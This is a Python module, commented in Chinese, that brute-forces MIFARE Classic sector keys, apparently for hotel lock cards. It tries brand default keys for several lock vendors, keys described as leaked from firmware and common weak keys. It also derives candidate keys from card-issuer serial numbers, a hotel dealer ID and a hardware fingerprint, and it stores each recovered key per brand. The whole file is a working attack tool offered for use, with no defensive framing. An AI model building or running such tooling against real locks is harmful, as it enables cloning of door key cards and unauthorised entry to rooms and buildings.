"""
MIFARE Classic 弱密钥字典爆破（增强版）

增强点：
1. 品牌密钥优先 + 通用弱密钥 + SN派生 + dlsCoID派生 + 固件泄露
2. 自动识别卡型（Classic 1K/4K / DESFire / Ultralight）
3. 非 Classic 自动降级
4. 支持嵌套攻击已知明文（known-plaintext）
"""

import os, json, time, hashlib
from pathlib import Path
from typing import Dict, List, Optional, Callable

# ── 通用 MIFARE Classic 弱密钥 ──────────────────────────────────
DEFAULT_WEAK_KEYS = list(dict.fromkeys([
    "FFFFFFFFFFFF", "000000000000", "A0A1A2A3A4A5", "B0B1B2B3B4B5",
    "AABBCCDDEEFF", "D3F7D3F7D3F7", "A0B0C0D0E0F0", "1A2B3C4D5E6F",
    "B5FF67CBA951", "714C5C886E97", "587EE5F9350F", "A05FBC4F65FE",
    "E4D2770A89BE", "E64D23010E90", "FC00018778F7", "00000FFE2488",
    "010203040506", "0123456789AB", "123456789ABC",
    "ABCDEF123456", "A1B2C3D4E5F6", "4D3A99C351DD", "1A982C7E459A",
    "B1B2B3B4B5B6", "C1C2C3C4C5C6", "D1D2D3D4D5D6",
    "A0B1C2D3E4F5", "A1B2C3D4E5F6", "A2B3C4D5E6F7", "A3B4C5D6E7F8",
    "A4B5C6D7E8F9", "A5B6C7D8E9F0",
]))

# ── 厂家默认密钥 ──────────────────────────────────────────────────
BRAND_DEFAULT_KEYS = {
    "proUSB_V9": ["A0A1A2A3A4A5", "FFFFFFFFFFFF", "000000000000",
                   "B0B1B2B3B4B5", "AABBCCDDEEFF"],
    "aidier_3200": ["FFFFFFFFFFFF", "000000000000", "A0A1A2A3A4A5"],
    "aidier_9200": ["FFFFFFFFFFFF", "000000000000", "A0A1A2A3A4A5"],
    "bida_ib": ["FFFFFFFFFFFF", "000000000000", "A0A1A2A3A4A5"],
    "baoxunda": ["FFFFFFFFFFFF", "000000000000"],
    "tongchuang": ["FFFFFFFFFFFF", "000000000000"],
    "yadidun": ["FFFFFFFFFFFF", "000000000000"],
    "level_lock": ["FFFFFFFFFFFF", "000000000000"],
    "syron": ["FFFFFFFFFFFF", "000000000000"],
}

# ── 固件泄露密钥 ──────────────────────────────────────────────────
FIRMWARE_LEAKED_KEYS = [
    "A0A1A2A3A4A5", "B0B1B2B3B4B5", "C0C1C2C3C4C5", "D0D1D2D3D4D5",
    "E0E1E2E3E4E5", "F0F1F2F3F4F5",
    "A5A4A3A2A1A0", "B5B4B3B2B1B0", "C5C4C3C2C1C0",
    "D5D4D3D2D1D0", "E5E4E3E2E1E0", "F5F4F3F2F1F0",
    "001122334455", "112233445566", "223344556677",
    "334455667788", "445566778899", "5566778899AA",
    "66778899AABB", "778899AABBCC", "8899AABBCCDD",
    "99AABBCCDDEE",
]

_CARD_TYPE_HINTS = {
    "classic_1k": "MIFARE Classic 1K (S50)",
    "classic_4k": "MIFARE Classic 4K (S70)",
    "desfire": "MIFARE DESFire (不支持弱密钥爆破)",
    "ultralight": "MIFARE Ultralight (无密钥)",
    "plus": "MIFARE Plus (需AES认证)",
}


def _get_collector_root() -> Path:
    import sys
    if getattr(sys, 'frozen', False):
        return Path(sys.executable).resolve().parent
    return Path(__file__).resolve().parent.parent


def _load_brand_keys(brand: str) -> List[str]:
    root = _get_collector_root()
    key_file = root / "learned_profiles" / "sector_keys" / f"{brand}.json"
    if key_file.exists():
        try:
            data = json.loads(key_file.read_text(encoding='utf-8'))
            return data.get("keys", [])
        except Exception:
            pass
    return []


def _load_known_signatures_keys() -> List[str]:
    root = _get_collector_root()
    sig_file = root / "known_signatures.json"
    if sig_file.exists():
        try:
            data = json.loads(sig_file.read_text(encoding='utf-8'))
            hints = data.get("encryption_hints", {})
            keys = []
            for brand, info in hints.items():
                if isinstance(info, dict):
                    keys.extend(info.get("known_keys", []))
            return keys
        except Exception:
            pass
    return []


def _save_brand_keys(brand: str, keys_dict: Dict[int, str]) -> None:
    root = _get_collector_root()
    key_dir = root / "learned_profiles" / "sector_keys"
    key_dir.mkdir(parents=True, exist_ok=True)
    key_file = key_dir / f"{brand}.json"
    existing = {}
    if key_file.exists():
        try:
            existing = json.loads(key_file.read_text(encoding='utf-8'))
        except Exception:
            pass
    existing.setdefault("keys", [])
    existing.setdefault("sectors", {})
    for sector, key in keys_dict.items():
        existing["sectors"][str(sector)] = key
        if key not in existing["keys"]:
            existing["keys"].append(key)
    existing["last_updated"] = time.strftime("%Y-%m-%d %H:%M:%S")
    key_file.write_text(json.dumps(existing, indent=2, ensure_ascii=False), encoding='utf-8')


def derive_keys_from_sn(sn_hex: str) -> List[str]:
    """从发卡器序列号派生候选密钥。"""
    keys = []
    if len(sn_hex) >= 8:
        # SN 前 6 字节
        keys.append(sn_hex[:12])
        # SN 后 6 字节
        keys.append(sn_hex[-12:])
        # SN XOR 固定值
        try:
            sn_bytes = bytes.fromhex(sn_hex[:12])
            xor_key = bytes(a ^ 0xA5 for a in sn_bytes).hex().upper()
            keys.append(xor_key)
        except Exception:
            pass
    return keys


def derive_keys_from_dlscoid(dls_co_id: int) -> List[str]:
    """从酒店经销商 ID 派生候选密钥。"""
    keys = []
    try:
        # dlsCoID 的 hex 表示，补齐 6 字节
        hex_val = f"{dls_co_id:012X}"
        keys.append(hex_val)
        # dlsCoID XOR 固定掩码
        mask = bytes.fromhex("A0A1A2A3A4A5")
        sn_bytes = bytes.fromhex(hex_val)
        xor_key = bytes(a ^ b for a, b in zip(sn_bytes, mask)).hex().upper()
        keys.append(xor_key)
    except Exception:
        pass
    return keys


def derive_keys_from_pcid(pcid_hex: str) -> List[str]:
    """从 PCID（硬件指纹）派生候选密钥。"""
    keys = []
    try:
        if len(pcid_hex) >= 12:
            # SHA256 前 6 字节
            h = hashlib.sha256(pcid_hex.encode()).hexdigest()[:12].upper()
            keys.append(h)
    except Exception:
        pass
    return keys


class WeakKeyBruteForcer:
    """MIFARE Classic 弱密钥爆破器（增强版）。"""

    def __init__(self, brand: str = "", sn_hex: str = "",
                 dls_co_id: int = 0, pcid_hex: str = ""):
        self.brand = brand
        self.should_stop = False
        self.progress_callback = None

        # 构建密钥字典：品牌默认 > 品牌已保存 > SN派生 > dlsCoID派生 > 固件泄露 > 通用
        self.key_dict = []
        seen = set()

        def _add(kl):
            for k in kl:
                ku = k.upper().replace(" ", "")
                if len(ku) == 12 and ku not in seen:
                    seen.add(ku)
                    self.key_dict.append(ku)

        _add(BRAND_DEFAULT_KEYS.get(brand, []))
        _add(_load_brand_keys(brand))
        _add(_load_known_signatures_keys())
        if sn_hex:
            _add(derive_keys_from_sn(sn_hex))
        if dls_co_id:
            _add(derive_keys_from_dlscoid(dls_co_id))
        if pcid_hex:
            _add(derive_keys_from_pcid(pcid_hex))
        _add(FIRMWARE_LEAKED_KEYS)
        _add(DEFAULT_WEAK_KEYS)

    def stop(self):
        self.should_stop = True

    def brute_force_sector(self, sector: int,
                           auth_func: Callable[[str], bool]) -> Optional[str]:
        total = len(self.key_dict)
        for idx, key in enumerate(self.key_dict):
            if self.should_stop:
                return None
            if self.progress_callback:
                self.progress_callback(sector, idx, total, key)
            try:
                if auth_func(key):
                    if self.brand:
                        _save_brand_keys(self.brand, {sector: key})
                    return key
            except Exception:
                pass
            time.sleep(0.005)
        return None

    def brute_force_all_sectors(self, sectors: List[int],
                                auth_func: Callable[[str], bool]) -> Dict[int, str]:
        results = {}
        for sector in sectors:
            if self.should_stop:
                break
            key = self.brute_force_sector(sector, auth_func)
            if key:
                results[sector] = key
        return results

    @staticmethod
    def guess_card_type(atr_hex: str = "", uid_len: int = 4) -> str:
        """根据 ATR/UID 长度推测卡型。"""
        if atr_hex:
            atr = atr_hex.upper()
            if "3B8F" in atr:
                return "classic_1k"
            if "3B8E" in atr:
                return "classic_4k"
            if "3B81" in atr:
                return "desfire"
            if "3B" in atr and len(atr) > 20:
                return "plus"
        if uid_len == 7:
            return "desfire"
        if uid_len == 4:
            return "classic_1k"
        return "unknown"

    @staticmethod
    def can_brute_force(card_type: str) -> bool:
        """判断该卡型是否支持弱密钥爆破。"""
        return card_type in ("classic_1k", "classic_4k", "unknown")
